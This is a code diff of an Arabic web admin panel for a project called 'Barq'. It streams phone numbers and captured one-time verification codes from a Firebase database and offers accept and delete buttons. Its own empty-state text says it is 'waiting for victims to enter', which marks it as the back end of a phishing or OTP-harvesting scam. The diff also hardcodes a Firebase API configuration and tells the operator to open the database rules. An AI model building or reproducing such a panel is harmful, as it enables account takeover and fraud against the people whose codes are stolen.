@@ -2,50 +2,101 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة التحكم - برق</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم برق | الإدارة</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
-        .card { background: #fff; padding: 15px; margin-bottom: 10px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .btn { padding: 8px 15px; border-radius: 5px; border: none; cursor: pointer; color: white; }
-        .accept { background: green; }
-        .reject { background: red; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; padding: 20px; direction: rtl; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h2 { text-align: center; color: #1a1a1a; margin-bottom: 30px; border-bottom: 2px solid #FFD700; padding-bottom: 10px; }
+        .card { background: #fff; padding: 20px; margin-bottom: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .info { flex-grow: 1; }
+        .info div { margin-bottom: 8px; font-size: 18px; color: #333; }
+        .phone { color: #007bff; font-weight: bold; font-size: 20px; }
+        .otp { color: #ff3b30; font-weight: bold; background: #fff3f3; padding: 4px 12px; border-radius: 6px; border: 1px solid #ffcccc; font-family: monospace; }
+        .actions { display: flex; gap: 10px; }
+        .btn { padding: 12px 24px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; transition: 0.3s; font-size: 14px; }
+        .accept { background: #28a745; color: white; }
+        .accept:hover { background: #218838; transform: scale(1.05); }
+        .reject { background: #dc3545; color: white; }
+        .reject:hover { background: #c82333; transform: scale(1.05); }
+        .no-data { text-align: center; padding: 100px 20px; color: #888; background: white; border-radius: 15px; }
+        .status-badge { font-size: 12px; padding: 2px 8px; border-radius: 20px; background: #eee; color: #666; margin-right: 10px; }
     </style>
 </head>
 <body>
-    <h2>البيانات الواردة</h2>
-    <div id="dataList"></div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+<div class="container">
+    <h2>لوحة التحكم - إدارة طلبات برق</h2>
+    <div id="dataList">
+        <div class="no-data">جاري الاتصال بقاعدة البيانات...</div>
+    </div>
+</div>
 
-        // ضع هنا إعدادات Firebase الخاصة بك
-        const firebaseConfig = { /* انسخها من Firebase Console */ };
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
-        const list = document.getElementById('dataList');
+    // إعداداتك التي أرسلتها
+    const firebaseConfig = {
+      apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
+      authDomain: "barq-9ba61.firebaseapp.com",
+      projectId: "barq-9ba61",
+      storageBucket: "barq-9ba61.firebasestorage.app",
+      messagingSenderId: "1060477857765",
+      appId: "1:1060477857765:web:e1e2c606668209f364090c"
+    };
 
-        onSnapshot(collection(db, "users"), (snapshot) => {
-            list.innerHTML = "";
-            snapshot.forEach((doc) => {
-                const data = doc.data();
-                const div = document.createElement('div');
-                div.className = 'card';
-                div.innerHTML = `
-                    <div><strong>الجوال:</strong> ${data.phone} | <strong>الرمز:</strong> ${data.otp}</div>
-                    <div>
-                        <button class="btn accept" onclick="alert('تم القبول')">قبول</button>
-                        <button class="btn reject" onclick="deleteRecord('${doc.id}')">رفض</button>
-                    </div>
-                `;
-                list.appendChild(div);
-            });
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const dataList = document.getElementById('dataList');
+
+    // جلب البيانات مع ترتيبها (الأحدث أولاً)
+    const q = query(collection(db, "users")); 
+
+    onSnapshot(q, (snapshot) => {
+        dataList.innerHTML = "";
+        
+        if (snapshot.empty) {
+            dataList.innerHTML = '<div class="no-data">قاعدة البيانات فارغة حالياً. بانتظار دخول ضحايا...</div>';
+            return;
+        }
+
+        snapshot.forEach((docSnap) => {
+            const data = docSnap.data();
+            const id = docSnap.id;
+            
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.innerHTML = `
+                <div class="info">
+                    <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
+                    <div>الرمز: <span class="otp">${data.otp || 'بانتظار الإدخال...'}</span></div>
+                </div>
+                <div class="actions">
+                    <button class="btn accept" onclick="alert('تم قبول رقم: ${data.phone}')">قبول ✅</button>
+                    <button class="btn reject" data-id="${id}">رفض/حذف ❌</button>
+                </div>
+            `;
+            dataList.appendChild(card);
         });
 
-        window.deleteRecord = async (id) => {
-            await deleteDoc(doc(db, "users", id));
-        };
-    </script>
+        // تفعيل زر الحذف
+        document.querySelectorAll('.reject').forEach(btn => {
+            btn.onclick = async (e) => {
+                const docId = e.target.getAttribute('data-id');
+                if(confirm('هل تريد حذف هذا الرقم من القائمة؟')) {
+                    await deleteDoc(doc(db, "users", docId));
+                }
+            };
+        });
+    }, (error) => {
+        dataList.innerHTML = `<div class="no-data" style="color:red;">خطأ في الصلاحيات: تأكد من تعديل الـ Rules في Firebase إلى true.</div>`;
+        console.error(error);
+    });
+</script>
+
 </body>
 </html>
